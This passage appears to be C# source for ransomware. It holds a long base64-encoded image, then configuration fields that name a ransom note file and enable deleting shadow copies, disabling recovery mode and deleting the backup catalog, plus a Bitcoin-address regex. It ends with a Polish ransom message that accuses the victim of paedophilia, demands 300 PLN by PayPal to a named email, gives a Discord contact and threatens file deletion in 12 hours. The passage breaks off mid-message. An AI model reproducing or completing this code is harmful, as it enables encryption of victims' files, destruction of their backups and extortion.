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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[27]
	{
		"WITAJ! TWOJE WSZYSTKIE PLIKI ZOSTALY ZASZYFROWANE PRZEZ WALKE Z PEDOFILIA!", "JESLI WIDZISZ TO TO PRAWDOPODOBNIE JESTES JEBANYM PEDOFILEM I PONIESIESZ", "KOSEKWENCJE", "-------------------------------------------------------------------------------------------------------------------", "co jesli nie wchodzilem? sprawdz czlonkow swojej rodziny,znajomych badz inne osoby ktore urzywaly twojego komputera ", "jak odszyfrowac komputer i przywrocic pliki? ", "oplac sume 300PLN na paypal : xanxxior22233@gmail.com ", "", "jesli to zrobiles skontaktuj sie discord by odszyfrowac pliki : endhorjim#4891", "TWOJE PLIKI ZOSTANA USUNIETE W 12 GODZIN JESLI NIE OPLACISZ OPLATY",
